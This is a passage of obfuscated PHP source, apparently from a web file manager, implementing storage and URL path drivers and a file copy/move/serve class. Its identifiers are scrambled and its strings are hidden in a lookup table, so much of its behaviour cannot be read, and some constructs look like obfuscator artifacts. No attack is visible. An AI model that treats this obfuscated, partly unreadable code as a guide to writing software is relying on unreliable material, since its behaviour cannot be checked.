$ñ§¥ıÙş), 12, 8) . $”ç—åÎÚ; $ÍŞ”õâ‘[] = $¡»ç’­Ñ[1608] . $ñçäş—ı; } $—Œˆ¦¶Ø = !empty($ÍŞ”õâ‘) ? $¡»ç’­Ñ[76] . implode($¡»ç’­Ñ[286], $ÍŞ”õâ‘) : $¡»ç’­Ñ[12]; return $this->getHost() . $¡»ç’­Ñ[8] . $this->pathEncode($ñ§¥ıÙş) . $—Œˆ¦¶Ø; } public function fileOut($ëÈµş, $ÑÉü²ú´ = false, $àñ³ÄÅ = false, $ úÇ™™³ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ëÈµş, $ÑÉü²ú´, $àñ³ÄÅ, $ úÇ™™³); } if (!$àñ³ÄÅ) { $àñ³ÄÅ = $this->pathThis($ëÈµş); } $ã€÷¢·„ = $ÑÉü²ú´ ? array($_SERVER[†ûãı«°][1609] . rawurlencode($àñ³ÄÅ)) : array(); $Ÿ„èĞ = $this->link($ëÈµş, $ã€÷¢·„); $this->fileOutLink($Ÿ„èĞ); } public function fileOutServer($Ø®µÂÕè, $ş­„«Ãˆ = false, $²ÍĞåÀœ = false, $ÔÒ›¾Şğ = '') { parent::fileOut($Ø®µÂÕè, $ş­„«Ãˆ, $²ÍĞåÀœ, $ÔÒ›¾Şğ); } public function fileOutImage($³ıÂïïÔ, $µÏÕôÔ‡ = 250) { $¢¢¨äôÔ = $this->link($³ıÂïïÔ . $_SERVER[†ûãı«°][1610] . $µÏÕôÔ‡); $this->fileOutLink($¢¢¨äôÔ); } public function fileOutImageServer($Î­‚×©“, $‹¶ßÅÀÙ = 250) { parent::fileOutImage($Î­‚×©“, $‹¶ßÅÀÙ); } public function hashMd5($©ØÈ…ÃÎ) { $Ö³û«Â£ =& $_SERVER[†ûãı«°]; $ÑËš›•ä = $this->_objectMeta($©ØÈ…ÃÎ); return isset($ÑËš›•ä[$Ö³û«Â£[247]]) ? $ÑËš›•ä[$Ö³û«Â£[247]] : !1; } public function size($´¾ûÓÀÖ) { $ƒºˆ¹âÔ = $this->objectMeta($´¾ûÓÀÖ); return $ƒºˆ¹âÔ ? $ƒºˆ¹âÔ[$_SERVER[†ûãı«°][79]] : 0; } public function info($÷—‚¯º¬) { if ($this->isFolder($÷—‚¯º¬)) { return $this->folderInfo($÷—‚¯º¬); } else { if ($this->isFile($÷—‚¯º¬)) { return $this->fileInfo($÷—‚¯º¬); } } return !1; } public function exist($•ë‡ßÄ…) { return $this->isFile($•ë‡ßÄ…) || $this->isFolder($•ë‡ßÄ…); } public function isFile($Ç•Ğ…ßğ) { return !$this->isFolder($Ç•Ğ…ßğ) && $this->objectMeta($Ç•Ğ…ßğ); } public function isFolder($Ó—˜‡³Ç) { return $this->cacheMethod($_SERVER[†ûãı«°][179], $Ó—˜‡³Ç); } protected function objectMeta($ê©«åÒÌ) { return $this->cacheMethod($_SERVER[†ûãı«°][181], $ê©«åÒÌ); } protected function _objectMeta($ûÎôÓ€Ô) { $ë­—İ‚Ø =& $_SERVER[†ûãı«°]; if ($ûÎôÓ€Ô == $ë­—İ‚Ø[12] || $ûÎôÓ€Ô == $ë­—İ‚Ø[8]) { return array(); } $çºü²ü = $this->ussRequest($ûÎôÓ€Ô, $ë­—İ‚Ø[1611]); if (!$çºü²ü[$ë­—İ‚Ø[1308]]) { return null; } $äÊİ•·Í = isset($çºü²ü[$ë­—İ‚Ø[1298]]) ? $çºü²ü[$ë­—İ‚Ø[1298]] : array(); if (!isset($äÊİ•·Í[$ë­—İ‚Ø[1612]])) { return null; } $Ë€©‚Ë = array($ë­—İ‚Ø[33] => isset($äÊİ•·Í[$ë­—İ‚Ø[1612]]) ? $äÊİ•·Í[$ë­—İ‚Ø[1612]] : null, $ë­—İ‚Ø[79] => isset($äÊİ•·Í[$ë­—İ‚Ø[1613]]) ? $äÊİ•·Í[$ë­—İ‚Ø[1613]] : null, $ë­—İ‚Ø[247] => isset($äÊİ•·Í[$ë­—İ‚Ø[1614]]) ? $äÊİ•·Í[$ë­—İ‚Ø[1614]] : null, $ë­—İ‚Ø[1581] => isset($äÊİ•·Í[$ë­—İ‚Ø[1615]]) ? $äÊİ•·Í[$ë­—İ‚Ø[1615]] : null); $Ë€©‚Ë[$ë­—İ‚Ø[1582]] = isset($äÊİ•·Í[$ë­—İ‚Ø[1616]]) ? strtotime($äÊİ•·Í[$ë­—İ‚Ø[1616]]) : $Ë€©‚Ë[$ë­—İ‚Ø[1581]]; return $Ë€©‚Ë; } protected function _isFolder($ÕÂÑ®šÑ) { $²¡›” =& $_SERVER[†ûãı«°]; if ($ÕÂÑ®šÑ == $²¡›”[12] || $ÕÂÑ®šÑ == $²¡›”[8]) { return !0; } $ÒÖ·Ÿµ° = $this->_objectMeta($ÕÂÑ®šÑ); return isset($ÒÖ·Ÿµ°[$²¡›”[33]]) && $ÒÖ·Ÿµ°[$²¡›”[33]] == $²¡›”[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Ç¬‡Öñ = false) { } public function exist($´Ù†½×£) { $»§’†úÙ = $this->info($´Ù†½×£); return $»§’†úÙ[$_SERVER[†ûãı«°][234]]; } public function isFile($•ŞÅŞî×) { $Ä„Ò©óÔ = $this->info($•ŞÅŞî×); return $Ä„Ò©óÔ[$_SERVER[†ûãı«°][234]]; } public function isFolder($òÎäÆ¤) { return !1; } public function size($®íïï¶§) { $’÷Ï•éª = $this->info($®íïï¶§); return $’÷Ï•éª[$_SERVER[†ûãı«°][79]]; } public function info($ôµ³¿µ¾) { return $this->infoParse($ôµ³¿µ¾); } public function infoAuth($—ÓòØ¿) { return $this->infoParse($—ÓòØ¿); } public function infoWithChildren($ä¹–ä…Ô) { return $this->infoParse($ä¹–ä…Ô); } public function infoFull($‹êÜê¹Ê) { return $this->infoParse($‹êÜê¹Ê); } private function infoParse($Åšç×İØ) { $üé¬ÖÊ =& $_SERVER[†ûãı«°]; $“î¡Á‘ş = $this->header($Åšç×İØ); if (!$“î¡Á‘ş || !$“î¡Á‘ş[$üé¬ÖÊ[826]]) { return !1; } $¹Ú·²Í = _get($“î¡Á‘ş, $üé¬ÖÊ[414], 0); $Ñ¾üö¢› = array($üé¬ÖÊ[32] => $“î¡Á‘ş[$üé¬ÖÊ[32]], $üé¬ÖÊ[87] => $Åšç×İØ, $üé¬ÖÊ[33] => $üé¬ÖÊ[232], $üé¬ÖÊ[79] => intval($¹Ú·²Í), $üé¬ÖÊ[169] => get_path_ext($“î¡Á‘ş[$üé¬ÖÊ[32]]), $üé¬ÖÊ[1467] => $¹Ú·²Í > 0 && $“î¡Á‘ş[$üé¬ÖÊ[1617]], $üé¬ÖÊ[1468] => !1); return $Ñ¾üö¢›; } private function header($á¨˜ŒÄ¡) { $ìŞº²”‚ =& $_SERVER[†ûãı«°]; if (isset(self::$_cacheHeader[$á¨˜ŒÄ¡])) { return self::$_cacheHeader[$á¨˜ŒÄ¡]; } $–ØœÏÑ = isset($GLOBALS[$ìŞº²”‚[1618]]) ? $GLOBALS[$ìŞº²”‚[1618]] : !1; $GLOBALS[$ìŞº²”‚[1618]] = !0; self::$_cacheHeader[$á¨˜ŒÄ¡] = url_header($á¨˜ŒÄ¡); $GLOBALS[$ìŞº²”‚[1618]] = $–ØœÏÑ; return self::$_cacheHeader[$á¨˜ŒÄ¡]; } public function hashSimple($¦ÓıÖíÅ, $ÕŒ¦š¸¬ = false) { $Ê’ÙÑÛ– =& $_SERVER[†ûãı«°]; $úàúıß = $this->info($¦ÓıÖíÅ); if (!$úàúıß || !$úàúıß[$Ê’ÙÑÛ–[234]]) { return !1; } $¼îö¯Şğ = $úàúıß[$Ê’ÙÑÛ–[79]]; $º­‡–ÏĞ = 200; $Ñ…·±ú = 50; if ($¼îö¯Şğ <= $º­‡–ÏĞ * $Ñ…·±ú) { return md5($this->fileSubstr($¦ÓıÖíÅ, 0, $¼îö¯Şğ)) . $¼îö¯Şğ; } $ ÀçÊÅÔ = intval($¼îö¯Şğ / $Ñ…·±ú); $‘øî™–— = $Ê’ÙÑÛ–[12]; $¹êºÅ´ = timeFloat(); $÷Éî·Ã = 15; for ($¡çîĞäı = 0; $¡çîĞäı < $Ñ…·±ú; $¡çîĞäı++) { if (timeFloat() - $¹êºÅ´ > $÷Éî·Ã) { return !1; } $³‰†¸îš = $this->fileSubstr($¦ÓıÖíÅ, $ ÀçÊÅÔ * $¡çîĞäı, $º­‡–ÏĞ); if (!$³‰†¸îš) { return !1; } $‘øî™–— .= $³‰†¸îš; } $‘øî™–— .= $this->fileSubstr($¦ÓıÖíÅ, $¼îö¯Şğ - $º­‡–ÏĞ, $º­‡–ÏĞ); return md5($‘øî™–—) . $¼îö¯Şğ; } public function getContent($Ï³®Öì) { return $this->fileSubstr($Ï³®Öì); } public function fileSubstr($êï§ï÷÷, $·‹ûÀä = 0, $Ô…¼Ç = -1) { $ú„Ë±§Ê =& $_SERVER[†ûãı«°]; $¼¤²š« = $this->info($êï§ï÷÷); if (!$¼¤²š« || !$¼¤²š«[$ú„Ë±§Ê[234]] && $¼¤²š«[$ú„Ë±§Ê[79]] > 1024 * 1024 * 10) { return !1; } if ($Ô…¼Ç === -1) { $Ô…¼Ç = $¼¤²š«[$ú„Ë±§Ê[79]]; } if ($Ô…¼Ç == 0) { return $ú„Ë±§Ê[12]; } $úÁ¸ºàš = array($ú„Ë±§Ê[1619] . $·‹ûÀä . $ú„Ë±§Ê[863] . ($·‹ûÀä + $Ô…¼Ç - 1)); $¯Á¥’‚ö = url_request($êï§ï÷÷, $ú„Ë±§Ê[1507], !1, $úÁ¸ºàš, !1, !1, 30); return $¯Á¥’‚ö[$ú„Ë±§Ê[1298]] ? $¯Á¥’‚ö[$ú„Ë±§Ê[1298]] : $ú„Ë±§Ê[12]; } public function download($øü³¤Òı, $é‡¯“Ğ) { Downloader::start($øü³¤Òı, $é‡¯“Ğ); return $é‡¯“Ğ; } } goto a‚­á¦µÊç; A­Í°ÍßÇ»: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($Ì¸ôéÄç, $ûÓúÈÌ£) { $¹€Ü‰Ä§ =& $_SERVER[†ûãı«°]; $´˜õ©ç = $ûÓúÈÌ£; $GLOBALS[$¹€Ü‰Ä§[1238]] = $¹€Ü‰Ä§[1239] . $Ì¸ôéÄç; Hook::trigger($¹€Ü‰Ä§[1239] . $Ì¸ôéÄç . $¹€Ü‰Ä§[1240], $´˜õ©ç); $Ú¿Üí£ = self::driverMake($ûÓúÈÌ£[0]); if (!$Ú¿Üí£) { return !1; } if (method_exists($Ú¿Üí£, $Ì¸ôéÄç)) { $¡·Ãß¦˜ = @call_user_func_array(array($Ú¿Üí£, $Ì¸ôéÄç), $ûÓúÈÌ£); } else { if (method_exists($Ú¿Üí£, $¹€Ü‰Ä§[1241])) { $¡·Ãß¦˜ = @call_user_func_array(array($Ú¿Üí£, $Ì¸ôéÄç), $ûÓúÈÌ£); } else { if (method_exists(self, $Ì¸ôéÄç)) { $¡·Ãß¦˜ = @call_user_func_array(array(self, $Ì¸ôéÄç), $ûÓúÈÌ£); } else { $¡·Ãß¦˜ = call_user_func_array(array(parent, $Ì¸ôéÄç), $ûÓúÈÌ£); } } } Hook::trigger($¹€Ü‰Ä§[1239] . $Ì¸ôéÄç . $¹€Ü‰Ä§[1242], $´˜õ©ç, $¡·Ãß¦˜); return $¡·Ãß¦˜; } public static function init($ıÇôÈÈÜ) { return self::driverMake($ıÇôÈÈÜ); } public static function copy($€òÜ™ì†, $ºä£Åê§, $×ğã•åÏ = false, $îÃøï·¾ = false) { return self::copyMoveStart($€òÜ™ì†, $ºä£Åê§, $×ğã•åÏ, $_SERVER[†ûãı«°][625], $îÃøï·¾); } public static function move($İªÉíµÆ, $µŞüªãö, $ªÇ¿€»õ = false, $Ã•Œªá’ = false) { return self::copyMoveStart($İªÉíµÆ, $µŞüªãö, $ªÇ¿€»õ, $_SERVER[†ûãı«°][627], $Ã•Œªá’); } public static function copyMoveChildren($®´Ú¥£¸, $âÑ¿¦«Ë, $Ÿ¾ŠŠÙî = "\x63\157\160\171", $‚¹Æï–æ = REPEAT_REPLACE) { $ÛÇÏÃĞ =& $_SERVER[†ûãı«°]; $é÷æ€ßØ = $®´Ú¥£¸; $¤ÉÒæ±ì = self::driverMake($®´Ú¥£¸); $•¢öø¨Ó = $¤ÉÒæ±ì->listPath($®´Ú¥£¸, !0); $™µ‘ÒÁ– = array_merge($•¢öø¨Ó[$ÛÇÏÃĞ[86]], $•¢öø¨Ó[$ÛÇÏÃĞ[85]]); foreach ($™µ‘ÒÁ– as $å½Ù˜) { self::copyMoveStart($å½Ù˜[$ÛÇÏÃĞ[87]], $âÑ¿¦«Ë, $‚¹Æï–æ, $Ÿ¾ŠŠÙî, !1); } if ($Ÿ¾ŠŠÙî == $ÛÇÏÃĞ[627]) { self::remove($é÷æ€ßØ); } } private static function copyMoveStart($¿˜ÚËÈ, $ÙœÎ¢®, $Î‹Ñ¸‹…, $ñ¿öĞ³ò, $£¶¨ÂØü) { $Ò™ˆ¸‰ì =& $_SERVER[†ûãı«°]; $ŸÁêòÇ½ = array($¿˜ÚËÈ, $ÙœÎ¢®, $Î‹Ñ¸‹…, $£¶¨ÂØü); Hook::trigger($Ò™ˆ¸‰ì[1239] . $ñ¿öĞ³ò . $Ò™ˆ¸‰ì[1240], $ŸÁêòÇ½); $º™”¹óş = self::copyMove($¿˜ÚËÈ, $ÙœÎ¢®, $Î‹Ñ¸‹…, $ñ¿öĞ³ò, $£¶¨ÂØü); Hook::trigger($Ò™ˆ¸‰ì[1239] . $ñ¿öĞ³ò . $Ò™ˆ¸‰ì[1242], $ŸÁêòÇ½, $º™”¹óş); return $º™”¹óş; } public static function saveFile($ˆ“ùê»Ğ, $Øß¥Ä, $È¹Ã‡ì = true) { $¨€°‰ÃÇ =& $_SERVER[†ûãı«°]; $¨’í½£¨ = self::info($Øß¥Ä); $Ã›ËïäÊ = self::driverMake($ˆ“ùê»Ğ); $‡ø¿¶Óå = self::driverMake($Øß¥Ä); $ëì‡´‘ù = !1; if ($‡ø¿¶Óå->pathParse[$¨€°‰ÃÇ[1243]]) { $ëì‡´‘ù = $‡ø¿¶Óå; $¸ÂİøÕ = $‡ø¿¶Óå->pathParse[$¨€°‰ÃÇ[1243]]; $‡ø¿¶Óå = self::driverMake($¸ÂİøÕ); } if ($Ã›ËïäÊ->pathParse[$¨€°‰ÃÇ[1243]]) { $Á‹ÎƒÜŒ = $Ã›ËïäÊ->pathParse[$¨€°‰ÃÇ[1243]]; $Ã›ËïäÊ = self::driverMake($Á‹ÎƒÜŒ); } $ò®†ÅÀ = $‡ø¿¶Óå->pathFather($Øß¥Ä); $Ì’ÑÉÒë = !0; if (!$È¹Ã‡ì && self::driverIsSame($Ã›ËïäÊ, $‡ø¿¶Óå)) { $Ì’ÑÉÒë = !1; } $Øù´Ñ¾ß = self::copyFile($Ã›ËïäÊ, $ˆ“ùê»Ğ, $‡ø¿¶Óå, $ò®†ÅÀ, $¨’í½£¨[$¨€°‰ÃÇ[32]], $Ì’ÑÉÒë); if ($ëì‡´‘ù) { $Øù´Ñ¾ß = $ëì‡´‘ù->getPathOuter($Øù´Ñ¾ß); } return $Øù´Ñ¾ß; } private static function copyMove($ìõ½‰, $ÀÀèÛ¾‹, $æÂÏÕÒ‹, $¨µ–—à, $’¼ï®É® = false) { $ÓæÅŸßÜ =& $_SERVER[†ûãı«°]; if (!$ìõ½‰ || $ìõ½‰ == $ÓæÅŸßÜ[8] || !$ÀÀèÛ¾‹) { return !1; } ignore_timeout(); $åÎâæ‰ = self::driverMake($ìõ½‰); $«‹Ë˜‹Å = self::driverMake($ÀÀèÛ¾‹); $»Õå¾ßã = $¨µ–—à == $ÓæÅŸßÜ[627]; $Şà“ãÏû = !1; if ($«‹Ë˜‹Å->pathParse[$ÓæÅŸßÜ[1243]]) { $Şà“ãÏû = $«‹Ë˜‹Å; $ÀÀèÛ¾‹ = $«‹Ë˜‹Å->pathParse[$ÓæÅŸßÜ[1243]]; $«‹Ë˜‹Å = self::driverMake($ÀÀèÛ¾‹); } if ($åÎâæ‰->pathParse[$ÓæÅŸßÜ[1243]]) { $ìõ½‰ = $åÎâæ‰->pathParse[$ÓæÅŸßÜ[1243]]; $åÎâæ‰ = self::driverMake($ìõ½‰); } self::check($åÎâæ‰, $ìõ½‰, $«‹Ë˜‹Å, $ÀÀèÛ¾‹); Hook::trigger($ÓæÅŸßÜ[1244], $åÎâæ‰, $ìõ½‰, $«‹Ë˜‹Å, $ÀÀèÛ¾‹); $¿§½­š = self::driverIsSame($åÎâæ‰, $«‹Ë˜‹Å); if ($¿§½­š) { if ($¨µ–—à == $ÓæÅŸßÜ[627] && !method_exists($«‹Ë˜‹Å, $ÓæÅŸßÜ[1245]) && trim($ÀÀèÛ¾‹, $ÓæÅŸßÜ[8]) == trim($«‹Ë˜‹Å->pathFather($ìõ½‰), $ÓæÅŸßÜ[8])) { if ($åÎâæ‰->pathThis($ìõ½‰) != $’¼ï®É® && !$åÎâæ‰->isOsDriver()) { return $åÎâæ‰->rename($ìõ½‰, $’¼ï®É®); } return $«‹Ë˜‹Å->getPathOuter($ìõ½‰); } if (method_exists($«‹Ë˜‹Å, $¨µ–—à)) { return $«‹Ë˜‹Å->{$¨µ–—à}($ìõ½‰, $ÀÀèÛ¾‹, $æÂÏÕÒ‹, $’¼ï®É®); } } if ($¿§½­š && $¨µ–—à == $ÓæÅŸßÜ[627] && $«‹Ë˜‹Å->getType() == $ÓæÅŸßÜ[109]) { $éÜ£Ú¿— = $«‹Ë˜‹Å->movePath($ìõ½‰, $ÀÀèÛ¾‹, $’¼ï®É®); if ($éÜ£Ú¿—) { return $éÜ£Ú¿—; } } $ëµîÁ×Å = $åÎâæ‰->isFile($ìõ½‰); if (!$ëµîÁ×Å && $«‹Ë˜‹Å->getType() == $ÓæÅŸßÜ[833] && $åÎâæ‰->getType() == $ÓæÅŸßÜ[109]) { $éÜ£Ú¿— = $«‹Ë˜‹Å->copyFolderFromIO($åÎâæ‰, $ìõ½‰, $ÀÀèÛ¾‹, $æÂÏÕÒ‹, $»Õå¾ßã, $’¼ï®É®); } else { $éÜ£Ú¿— = self::copyPath($åÎâæ‰, $ìõ½‰, $«‹Ë˜‹Å, $ÀÀèÛ¾‹, $æÂÏÕÒ‹, $»Õå¾ßã, $ëµîÁ×Å, $’¼ï®É®); } if ($éÜ£Ú¿— && $»Õå¾ßã) { $åÎâæ‰->remove($ìõ½‰); } if ($Şà“ãÏû) { $éÜ£Ú¿— = $Şà“ãÏû->getPathOuter($éÜ£Ú¿—); } return $éÜ£Ú¿—; } private static function check($¿Íçï¸ù, $øÓ©Ú²ƒ, $•å§“Ö†, &$¼¸ÕĞ½ê) { $´²Ëäß =& $_SERVER[†ûãı«°]; if (self::driverIsSame($¿Íçï¸ù, $•å§“Ö†) && $¿Íçï¸ù->isFolder($øÓ©Ú²ƒ) && $¿Íçï¸ù->isParentOf($øÓ©Ú²ƒ, $¼¸ÕĞ½ê)) { show_json(LNG($´²Ëäß[1246]), !1); } if (!$¿Íçï¸ù->exist($øÓ©Ú²ƒ)) { show_json(LNG($´²Ëäß[108]), !1); } } private static function copyPath($àØØíü÷, $ËÃ¢¡Œ±, $Œ·´î¶´, $éÙĞÎ”ˆ, $’á”Œºã, $æ¡Ö²ÓÖ, $Ó÷ã€ŠÒ, $ùâ™­ùç = false, $€Å¾Áı´ = true) { $ˆÀ­³¼ß =& $_SERVER[†ûãı«°]; $ç·í ÜÌ = empty($ùâ™­ùç) && $ùâ™­ùç !== $ˆÀ­³¼ß[230] ? $àØØíü÷->pathThis($ËÃ¢¡Œ±) : $ùâ™­ùç; if ($’á”Œºã) { $Ğö“î­’ = $Œ·´î¶´->fileNameExist($éÙĞÎ”ˆ, $ç·í ÜÌ); $³ÙÉü˜ä = $ç·í ÜÌ; $ç·í ÜÌ = $Œ·´î¶´->fileNameAuto($éÙĞÎ”ˆ, $ç·í ÜÌ, $’á”Œºã, !$Ó÷ã€ŠÒ); if (!$Ğö“î­’ || $³ÙÉü˜ä != $ç·í ÜÌ) { $’á”Œºã = !1; } if ($€Å¾Áı´ && !$’á”Œºã) { $Œ·´î¶´->_data[$ˆÀ­³¼ß[1247]] = !0; } } if ($Ó÷ã€ŠÒ) { return self::copyFile($àØØíü÷, $ËÃ¢¡Œ±, $Œ·´î¶´, $éÙĞÎ”ˆ, $ç·í ÜÌ, $æ¡Ö²ÓÖ); } if ($’á”Œºã == REPEAT_RENAME_FOLDER) { $’á”Œºã = !1; } $¤Ş¯Œ¥Ù = rtrim($éÙĞÎ”ˆ, $ˆÀ­³¼ß[8]) . $ˆÀ­³¼ß[8] . $ç·í ÜÌ; $¶íàü… = $Œ·´î¶´->mkdir($Œ·´î¶´->getPath($¤Ş¯Œ¥Ù), $’á”Œºã); $éÙĞÎ”ˆ = $Œ·´î¶´->getPathInner($¶íàü…); $¹ˆÑ½Ïİ = $àØØíü÷->listPath($ËÃ¢¡Œ±, !0); $¹ˆÑ½Ïİ = is_array($¹ˆÑ½Ïİ) ? $¹ˆÑ½Ïİ : array($ˆÀ­³¼ß[86] => array(), $ˆÀ­³¼ß[85] => array()); $ìğ”¨´• = array_merge($¹ˆÑ½Ïİ[$ˆÀ­³¼ß[86]], $¹ˆÑ½Ïİ[$ˆÀ­³¼ß[85]]); foreach ($ìğ”¨´• as $Òğº·–†) { $¡ïÌ˜ = $Òğº·–†[$ˆÀ­³¼ß[33]] == $ˆÀ­³¼ß[232]; $ËÃ¢¡Œ± = $àØØíü÷->getPathInner($Òğº·–†[$ˆÀ­³¼ß[87]]); $÷«ğú“ = self::copyPath($àØØíü÷, $ËÃ¢¡Œ±, $Œ·´î¶´, $éÙĞÎ”ˆ, $’á”Œºã, $æ¡Ö²ÓÖ, $¡ïÌ˜, !1, !1); if (!$÷«ğú“) { IO::errorTips($ˆÀ­³¼ß[1248] . $ËÃ¢¡Œ± . $ˆÀ­³¼ß[73] . $éÙĞÎ”ˆ); } } self::copyMoveKeepInfo($àØØíü÷, $ËÃ¢¡Œ±, $¶íàü…); return $¶íàü…; } private static function copyFile($Íˆİ‰È¸, $ŠÇëèÓ, $©¡¶Ë”ñ, $»óÓàÅ£, $ïÆæ„¡º, $“¦ô‡Ê) { $¹„Ç›Î§ =& $_SERVER[†ûãı«°]; $»óÓàÅ£ = $©¡¶Ë”ñ->getPath(rtrim($»óÓàÅ£, $¹„Ç›Î§[8]) . $¹„Ç›Î§[8] . $ïÆæ„¡º); $Ü¥Åó˜˜ = $¹„Ç›Î§[1249] . time() . rand_string(5); Hook::trigger($¹„Ç›Î§[1250], $Íˆİ‰È¸, $ŠÇëèÓ, $©¡¶Ë”ñ, $»óÓàÅ£, $ïÆæ„¡º, $Ü¥Åó˜˜); if (self::driverIsSame($Íˆİ‰È¸, $©¡¶Ë”ñ)) { if ($“¦ô‡Ê) { $„‘×Êƒ = $©¡¶Ë”ñ->moveFile($ŠÇëèÓ, $»óÓàÅ£); } else { $„‘×Êƒ = $©¡¶Ë”ñ->copyFile($ŠÇëèÓ, $»óÓàÅ£); } Hook::trigger($¹„Ç›Î§[1251], $Íˆİ‰È¸, $ŠÇëèÓ, $©¡¶Ë”ñ, $»óÓàÅ£, $ïÆæ„¡º, $„‘×Êƒ); self::copyMoveKeepInfo($Íˆİ‰È¸, $ŠÇëèÓ, $„‘×Êƒ); return $„‘×Êƒ; } $««ÖŞòß = TEMP_FILES; if ($GLOBALS[$¹„Ç›Î§[6]][$¹„Ç›Î§[92]][$¹„Ç›Î§[874]]) { $««ÖŞòß = $GLOBALS[$¹„Ç›Î§[6]][$¹„Ç›Î§[92]][$¹„Ç›Î§[874]]; } $Á®Áê³‹ = $««ÖŞòß; mk_dir($Á®Áê³‹); $éÄ…’üì = $Á®Áê³‹ . $Ü¥Åó˜˜; $¿šæÛÂ = $éÄ…’üì; $éÄ…’üì = $Íˆİ‰È¸->download($ŠÇëèÓ, $éÄ…’üì); $éÄ…’üì = $Íˆİ‰È¸->iconvApp($éÄ…’üì); if (substr($éÄ…’üì, strlen($««ÖŞòß)) == $««ÖŞòß) { $“¦ô‡Ê = !0; } $„‘×Êƒ = $©¡¶Ë”ñ->upload($»óÓàÅ£, $éÄ…’üì, $“¦ô‡Ê); self::remove($¿šæÛÂ); Hook::trigger($¹„Ç›Î§[1251], $Íˆİ‰È¸, $ŠÇëèÓ, $©¡¶Ë”ñ, $»óÓàÅ£, $ïÆæ„¡º, $„‘×Êƒ); self::copyMoveKeepInfo($Íˆİ‰È¸, $ŠÇëèÓ, $„‘×Êƒ); return $„‘×Êƒ; } private static function copyMoveKeepInfo($ãûöÊ•œ, $¢¶Ó’Ù¼, $¹¤öĞ­š) { if (!$¹¤öĞ­š) { return; } $Û £‚é = $ãûöÊ•œ->info($¢¶Ó’Ù¼); if (!is_array($Û £‚é)) { return; } IO::setModifyTime($¹¤öĞ­š, $Û £‚é[$_SERVER[†ûãı«°][88]]); } public static function pathFather($·½÷Ç‡´) { $èÕÉÆà„ = IO::init($·½÷Ç‡´); $ıò•Ó = $èÕÉÆà„->pathFather($èÕÉÆà„->path); return $èÕÉÆà„->getPathOuter($ıò•Ó); } public static function fileOut($òŸĞè¯ğ, $”ü˜Œğ = false, $­ Òéê = false, $ €ƒÃãş = '') { $¯¾°ûî = self::driverMake($òŸĞè¯ğ); if ($¯¾°ûî->isFileOutServer()) { return $¯¾°ûî->fileOutServer($òŸĞè¯ğ, $”ü˜Œğ, $­ Òéê, $ €ƒÃãş); } return $¯¾°ûî->fileOut($òŸĞè¯ğ, $”ü˜Œğ, $­ Òéê, $ €ƒÃãş); } public static function fileOutImage($Òå¾İ’, $ÌáËì¥Â = 250) { $â³×“¹Ó = array(250, 600, 1200, 2000, 3000, 5000); for ($×È¹Ú¼ = 0; $×È¹Ú¼ < count($â³×“¹Ó); $×È¹Ú¼++) { if ($×È¹Ú¼ == 0 && $ÌáËì¥Â <= $â³×“¹Ó[$×È¹Ú¼]) { $ÌáËì¥Â = $â³×“¹Ó[$×È¹Ú¼]; break; } else { if ($ÌáËì¥Â > $â³×“¹Ó[$×È¹Ú¼ - 1] && $ÌáËì¥Â <= $â³×“¹Ó[$×È¹Ú¼]) { $ÌáËì¥Â = $â³×“¹Ó[$×È¹Ú¼]; break; } else { if ($×È¹Ú¼ == count($â³×“¹Ó) - 1 && $ÌáËì¥Â > $â³×“¹Ó[$×È¹Ú¼]) { $ÌáËì¥Â = $â³×“¹Ó[$×È¹Ú¼]; break; } } } } $‹ÙÂ€× = self::driverMake($Òå¾İ’); if ($‹ÙÂ€×->isFileOutServer()) { return $‹ÙÂ€×->fileOutImageServer($Òå¾İ’, $ÌáËì¥Â); } return $‹ÙÂ€×->fileOutImage($Òå¾İ’, $ÌáËì¥Â); } private static function driverIsSame($´Îœ»†£, $ŸøÌşö) { $¹¢üû§ù =& $_SERVER[†ûãı«°]; $Ì‚í½ùÃ = $´Îœ»†£->getType(); $âøíß§Ë = $ŸøÌşö->getType(); if ($Ì‚í½ùÃ != $âøíß§Ë) { return !1; } if ($Ì‚í½ùÃ == $¹¢üû§ù[833]) { return !0; } if ($Ì‚í½ùÃ == $¹¢üû§ù[109]) { return !0; } if ($´Îœ»†£->pathDriver == $ŸøÌşö->pathDriver) { return !0; } return !1; } public static function copyUpdate($³ú·ì¨å, $îÒ×Å”ø) { $«øØÏ§ =& $_SERVER[†ûãı«°]; if (!IO::exist($³ú·ì¨å)) { return !1; } if (!IO::exist($îÒ×Å”ø)) { IO::mkdir($îÒ×Å”ø); } $şÑË³È = array_to_keyvalue(self::listAllSimple($³ú·ì¨å), $«øØÏ§[87]); $¯šÜÇüæ = array_to_keyvalue(self::listAllSimple($îÒ×Å”ø), $«øØÏ§[87]); $íšõÊÙ = array(); $ÓñÚ‰ğÖ = array(); foreach ($şÑË³È as $È²ˆÒáü => $Şè…‘) { if (isset($¯šÜÇüæ[$È²ˆÒáü])) { if ($Şè…‘[$«øØÏ§[78]] == 1) { continue; } if ($¯šÜÇüæ[$È²ˆÒáü][$«øØÏ§[79]] == $Şè…‘[$«øØÏ§[79]]) { continue; } } if ($Şè…‘[$«øØÏ§[78]] == 1) { $ÓñÚ‰ğÖ[] = $îÒ×Å”ø . $«øØÏ§[8] . trim($È²ˆÒáü, $«øØÏ§[8]); continue; } $Óİ…ØÑÑ = strstr(trim($È²ˆÒáü, $«øØÏ§[8]), $«øØÏ§[8]) ? get_path_father($È²ˆÒáü) : $«øØÏ§[12]; $íšõÊÙ[] = array($«øØÏ§[1252] => $Şè…‘[$«øØÏ§[89]], $«øØÏ§[1253] => rtrim($îÒ×Å”ø, $«øØÏ§[8]) . $«øØÏ§[8] . $Óİ…ØÑÑ, $«øØÏ§[1254] => $Şè…‘); } $–ï¶óºì = array($«øØÏ§[232] => $íšõÊÙ, $«øØÏ§[78] => $ÓñÚ‰ğÖ); Hook::trigger($«øØÏ§[1255], $³ú·ì¨å, $îÒ×Å”ø, $–ï¶óºì); foreach ($ÓñÚ‰ğÖ as $Şè…‘) { IO::mkdir($Şè…‘); } foreach ($íšõÊÙ as $Şè…‘) { IO::copy($Şè…‘[$«øØÏ§[1252]], $Şè…‘[$«øØÏ§[1253]], REPEAT_REPLACE); } } public static function fileSubstr($ÍÇ¯ş€ë, $÷ğşŠÇØ, $¤ìŒİÒİ = false) { $ìÑŒî‰ =& $_SERVER[†ûãı«°]; $—›Íú…î = self::driverMake($ÍÇ¯ş€ë); $øˆ´íçş = $—›Íú…î->size($ÍÇ¯ş€ë); $®±–¤› = $÷ğşŠÇØ; 